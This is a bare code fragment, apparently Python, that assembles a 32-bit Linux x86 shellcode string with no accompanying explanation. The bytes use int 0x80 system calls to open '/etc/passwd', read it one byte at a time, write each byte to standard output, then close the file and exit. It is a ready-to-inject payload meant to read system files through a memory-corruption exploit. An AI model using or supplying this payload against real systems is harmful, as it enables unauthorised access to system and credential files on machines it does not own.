shellcode = ""
shellcode += "\xEB\x5C\x5E\xB8\x05\x00\x00\x00\x89\xF3\xB9\x00\x00\x00\x00\xBA"
shellcode += "\x00\x00\x00\x00\xCD\x80\x83\xF8\x00\x7C\x37\x89\xC7\x6A\x00\xB8"
shellcode += "\x03\x00\x00\x00\x89\xFB\x89\xE1\xBA\x01\x00\x00\x00\xCD\x80\x83"
shellcode += "\xF8\x00\x7E\x1E\xB8\x04\x00\x00\x00\xBB\x01\x00\x00\x00\x89\xE1"
shellcode += "\xBA\x01\x00\x00\x00\xCD\x80\xEB\xD6\xB8\x06\x00\x00\x00\x89\xFB"
shellcode += "\xCD\x80\xB8\x01\x00\x00\x00\xBB\x00\x00\x00\x00\xCD\x80\xE8\x9F"
shellcode += "\xFF\xFF\xFF"
shellcode += "/etc/passwd\x00"
